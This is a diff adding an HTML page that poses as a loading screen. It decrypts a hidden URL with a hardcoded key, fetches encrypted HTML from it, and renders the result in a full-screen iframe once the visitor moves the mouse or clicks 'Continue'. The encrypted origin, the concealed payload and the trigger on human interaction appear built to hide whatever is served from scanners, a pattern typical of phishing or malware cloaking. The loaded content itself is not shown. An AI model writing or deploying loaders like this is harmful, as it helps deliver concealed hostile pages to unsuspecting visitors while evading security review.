@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <title>Loading...</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { height: 100%; font-family: system-ui, sans-serif; background: #fefcf8; }
+        #frame { display: none; width: 100%; height: 100vh; border: 0; position: fixed; top: 0; left: 0; z-index: 9999; background: white; }
+        .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; display: flex; justify-content: center; align-items: center; z-index: 99999; }
+        .popup-content { background: #ffffff; padding: 60px; text-align: center; width: 100%; max-width: 600px; }
+        .loading-gif { width: 160px; height: 160px; margin-bottom: 30px; }
+        .popup-content p { font-size: 1.5rem; color: #1f2433; font-weight: 600; margin: 10px 0 35px 0; }
+        .buttons { display: flex; justify-content: center; gap: 25px; }
+        button { padding: 15px 35px; font-size: 1.1rem; border: none; border-radius: 8px; cursor: pointer; font-weight: 700; min-width: 150px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        #cancelBtn { background: #f44336; color: white; }
+        #continueBtn { background: #4CAF50; color: white; }
+        button:hover { opacity: 0.9; }
+    </style>
+</head>
+<body>
+
+    <div class="popup" id="customPopup">
+        <div class="popup-content">
+            <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+            <p>Loading... Please wait.</p>
+            <div class="buttons">
+                <button id="cancelBtn" type="button">Cancel</button>
+                <button id="continueBtn" type="button">Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <iframe id="frame" title="yoursomahearts" allowfullscreen></iframe>
+
+    <script>
+        // ============================================================
+        // 🔑 KEYS (Must match API)
+        // ============================================================
+        const PASSPHRASE = "MySecretKey@123";
+        const URL_KEY = "MySecretKey@123";
+
+        // ⚠️ THIS WILL BE REPLACED AFTER API DEPLOYMENT
+        const ENC_DATA_ORIGIN = "U2FsdGVkX1...";
+
+        let lastUrl = null;
+
+        // ============================================================
+        // 🔓 DECRYPT API URL
+        // ============================================================
+        const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+        const DATA_URL = DATA_ORIGIN;
+        console.log("🌐 Decrypted URL:", DATA_URL);
+
+        // ============================================================
+        // 🔐 DECRYPT CONTENT
+        // ============================================================
+        function simpleDecrypt(cipherText, passphrase) {
+            const key = CryptoJS.SHA256(passphrase);
+            const iv = CryptoJS.lib.WordArray.create([0, 0, 0, 0]);
+            const decrypted = CryptoJS.AES.decrypt(cipherText, key, { iv: iv });
+            return decrypted.toString(CryptoJS.enc.Utf8);
+        }
+
+        // ============================================================
+        // 🚀 LOAD SECRET
+        // ============================================================
+        async function loadSecret() {
+            const frame = document.getElementById("frame");
+            try {
+                console.log("📡 Fetching from:", DATA_URL);
+                const res = await fetch(DATA_URL);
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                const data = await res.json();
+                if (!data.cipher) throw new Error("No cipher");
+
+                const html = simpleDecrypt(data.cipher, PASSPHRASE);
+                if (!html || html.length < 50) throw new Error("Invalid HTML");
+
+                if (lastUrl) URL.revokeObjectURL(lastUrl);
+                const blob = new Blob([html], { type: "text/html" });
+                lastUrl = URL.createObjectURL(blob);
+                frame.src = lastUrl;
+                frame.style.display = "block";
+                document.getElementById("customPopup").style.display = "none";
+                console.log("✅ Loaded!");
+            } catch (e) {
+                console.error("❌", e);
+                alert("Error: " + e.message);
+                document.getElementById("customPopup").style.display = "none";
+            }
+        }
+
+        // ============================================================
+        // 🎯 EVENT HANDLERS
+        // ============================================================
+        document.getElementById("cancelBtn").addEventListener("click", function() {
+            document.getElementById("customPopup").style.display = "none";
+        });
+        document.getElementById("continueBtn").addEventListener("click", loadSecret);
+        window.addEventListener("mousemove", loadSecret, { once: true });
+    </script>
+</body>
+</html>
